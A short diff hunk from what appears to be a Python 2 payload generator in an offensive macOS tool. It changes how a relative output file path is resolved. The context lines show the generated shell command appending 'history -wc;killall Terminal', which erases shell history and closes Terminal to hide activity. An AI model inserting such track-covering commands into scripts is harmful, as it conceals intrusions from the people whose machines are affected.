@@ -40,7 +40,7 @@ class payload:
 		shell_command += "history -wc;killall Terminal"
 		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
 		if path[0] != '/':
-        	    path = os.getcwd()+'/'+path
+        	    path = os.environ['OLDPWD']+'/'+path
     		else:
         	    path = path
 		direct = os.path.split(path)[0]
